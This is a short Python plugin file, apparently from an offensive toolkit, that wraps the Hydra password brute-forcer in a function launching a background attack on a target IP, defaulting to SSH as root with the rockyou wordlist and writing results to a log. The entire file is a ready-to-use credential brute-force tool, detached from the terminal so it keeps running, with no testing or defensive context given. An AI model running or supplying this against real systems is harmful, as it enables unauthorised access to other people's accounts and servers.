# plugins/hydra_plugin.py
import subprocess, os, time
from pathlib import Path

def run_hydra_attack(target_ip, service="ssh", user="root", wordlist="rockyou.txt", log_dir="logs/hydra"):
    Path(log_dir).mkdir(parents=True, exist_ok=True)
    ts = int(time.time())
    log_file = os.path.join(log_dir, f"hydra_{ts}.log")

    cmd = [
        "nohup", "hydra",
        "-l", user,
        "-P", wordlist,
        f"{target_ip}", service
    ]

    subprocess.Popen(cmd, stdout=open(log_file, "w"), stderr=subprocess.STDOUT, preexec_fn=os.setpgrp)
    print(f"[hydra_plugin] Hydra brute-force started on {target_ip} ({service}) → {log_file}")
    return {"log": log_file, "timestamp": ts}
